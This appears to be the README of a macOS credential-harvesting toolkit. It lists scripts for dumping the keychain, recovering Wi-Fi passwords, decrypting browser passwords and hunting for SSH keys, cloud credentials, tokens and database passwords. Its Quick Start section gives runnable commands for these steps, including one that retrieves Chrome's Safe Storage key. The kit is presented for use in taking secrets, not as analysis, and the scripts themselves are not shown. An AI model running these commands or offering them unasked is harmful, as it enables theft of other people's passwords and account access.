# macOS Credential Harvesting

Extract credentials, tokens, and secrets from macOS systems.

## Files

| File | Description |
|------|-------------|
| [`keychain_dump.sh`](keychain_dump.sh) | Keychain extraction — metadata dump, password extraction, Wi-Fi passwords, certificate export, offline analysis with chainbreaker |
| [`browser_creds.md`](browser_creds.md) | Browser credential locations and decryption — Safari, Chrome, Firefox, Brave, Edge. Includes Python Chrome decryption script |
| [`credential_search.sh`](credential_search.sh) | Credential hunting — shell history, SSH keys, AWS/GCP/Azure creds, .env files, git credentials, Docker/npm/K8s tokens, database passwords |

## Quick Start

```bash
chmod +x keychain_dump.sh credential_search.sh

# Keychain metadata (no prompts)
./keychain_dump.sh dump-metadata

# Wi-Fi passwords
./keychain_dump.sh find-wifi

# Full credential hunt
./credential_search.sh

# Chrome passwords (see browser_creds.md for decryption script)
security find-generic-password -s "Chrome Safe Storage" -w
```
